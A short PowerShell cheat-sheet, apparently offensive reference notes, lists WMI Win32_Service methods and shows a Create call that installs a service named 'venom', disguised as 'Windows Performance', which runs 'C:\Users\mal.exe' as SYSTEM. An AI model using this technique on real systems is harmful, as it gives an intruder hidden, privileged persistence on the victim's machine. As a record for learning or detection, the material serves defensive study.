
#### **Methods List**

`PS > gwmi -class win32_service
`PS > gcim -ClassName win32_service
`PS > (gwmi -class win32_service -list ).methods | select Name
`PS > (get-cimclass -ClassName win32_service).cimclassmethods

#### **Create service**

`PS > (gwmi -Class Win32_service -list).methods
`PS > (gwmi -Class Win32_service -list).create
`PS > ((get-cimclass -ClassName win32_service).cimclassmethods | ? {$_.Name -eq "create"}).Parameters

`PS > $servicetype = [byte] 16
`PS > $errorcontrol = [byte] 1
`PS > iwmi -Class win32_service -Name Create -ArgumentList $false,"Windows Performance",$errorcontrol,$null,$null,"venom","C:\Users\mal.exe",$null,$servicetype,"Manual","NT AUTHORITY\SYSTEM",""

or 

```powershell 
PS > (gwmi -Class Win32_service -list).create

OverloadDefinitions
-------------------
System.Management.ManagementBaseObject Create(System.String Name, System.String DisplayName, System.String PathName, System.Byte ServiceType,
System.Byte ErrorControl, System.String StartMode, System.Boolean DesktopInteract, System.String StartName, System.String StartPassword, System.String
LoadOrderGroup, System.String[] LoadOrderGroupDependencies, System.String[] ServiceDependencies)
```